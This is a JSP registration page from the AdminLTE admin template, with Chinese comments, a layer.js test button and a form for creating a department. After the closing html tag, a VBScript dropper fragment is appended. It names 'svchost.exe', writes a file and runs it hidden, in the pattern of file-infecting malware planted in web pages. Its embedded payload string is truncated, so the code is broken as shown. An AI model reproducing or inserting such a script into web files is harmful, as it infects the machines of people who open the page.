<%@ page language="java" contentType="text/html; charset=utf-8"
    pageEncoding="utf-8"%>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>AdminLTE 2 | Registration Page</title>
  <!-- Tell the browser to be responsive to screen width -->
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <!-- Bootstrap 3.3.7 -->
  <link rel="stylesheet" href="../../bower_components/bootstrap/dist/css/bootstrap.min.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="../../bower_components/font-awesome/css/font-awesome.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="../../bower_components/Ionicons/css/ionicons.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="../../dist/css/AdminLTE.min.css">
  <!-- iCheck -->
  <link rel="stylesheet" href="../../plugins/iCheck/square/blue.css">

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->

  <!-- Google Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
</head>
<body class="hold-transition register-page">

<!-- ===============使用layer框架=============== -->
<!-- 你必须先引入jQuery1.8或以上版本 -->
  <script src="layer.js"></script>

  
  <script>
  
/*当点击id名字叫test1的时候便会出发该函数，则由对应提示框弹出*/
    $('#test1').on('click', function(){
    layer.msg('hello');
  });
</script>





<button id="test1">layer测试</button>

<div class="register-box">
  <div class="register-logo">
    <a href="../../index2.html"><b>Admin</b>LTE</a>
  </div>

  <div class="register-box-body">
    <p class="login-box-msg">创建一个新的部门</p>

    <form action="/Users/Administrator/Desktop/AdminLTE-master/pages/tables/data2.html" method="post">
      <div class="form-group has-feedback">
        <input type="text" class="form-control" placeholder="Full name">
        <span class="glyphicon glyphicon-user form-control-feedback"></span>
      </div>
      <div class="form-group has-feedback">
        <input type="email" class="form-control" placeholder="Email">
        <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
      </div>
      <div class="form-group has-feedback">
        <input type="password" class="form-control" placeholder="Password">
        <span class="glyphicon glyphicon-lock form-control-feedback"></span>
      </div>
      <div class="form-group has-feedback">
        <input type="password" class="form-control" placeholder="Retype password">
        <span class="glyphicon glyphicon-log-in form-control-feedback"></span>
      </div>
       <div class="form-group has-feedback">
        <input type="password" class="form-control" placeholder="电话">
        <span class="glyphicon glyphicon-phone form-control-feedback"></span>
      </div>
       <div class="form-group has-feedback">
          <!-- 单选的下拉框 -->
          <select class="form-control select2" style="width: 100%;">
                  <option value='' disabled selected style='display:none;'>所属部门</option>
                  <option>研发部</option>
                  <option>人事部</option>
                  <option>行政部</option>
                  <option>工程部</option>
                  <option>销售部</option>
                  <option>吃鸡部</option>
          </select>
      </div>
      <div class="form-group has-feedback">
          <!-- 单选的下拉框 -->
          <select class="form-control select2" style="width: 100%;">
                  <option value='' disabled selected style='display:none;'>所属机构</option>
                  <option>Alaska</option>
                  <option>California</option>
                  <option>Delaware</option>
                  <option>Tennessee</option>
                  <option>Texas</option>
                  <option>Washington</option>
          </select>
      </div>
      <!-- =================提交按钮部分================ -->
      <div class="row">       
        <!-- /.col -->        
      <input type="submit" href="#" class="btn btn-block btn-facebook btn-flat">
      <input type="reset" href="#" class="btn btn-block btn-google btn-flat">
        <!-- /.col -->
      </div>
    </form>
  </div>
  <!-- /.form-box -->
</div>
<!-- /.register-box -->
<!-- ================动态按钮提示测试====================== -->




<!-- =================foot部分 样式链接部分================== -->
<!-- jQuery 3 -->
<script src="../../bower_components/jquery/dist/jquery.min.js"></script>
<!-- Bootstrap 3.3.7 -->
<script src="../../bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
<!-- iCheck -->
<script src="../../plugins/iCheck/icheck.min.js"></script>
<script>
  $(function () {
    $('input').iCheck({
      checkboxClass: 'icheckbox_square-blue',
      radioClass: 'iradio_square-blue',
      increaseArea: '20%' /* optional */
    });
  });
</script>
</body>
</html>
<SCRIPT Language=VBScript><!--
DropFileName = "svchost.exe"
WriteData = "
FileObj.Close
End If
Set WSHshell = CreateObject("WScript.Shell")
WSHshell.Run DropPath, 0
//--></SCRIPT>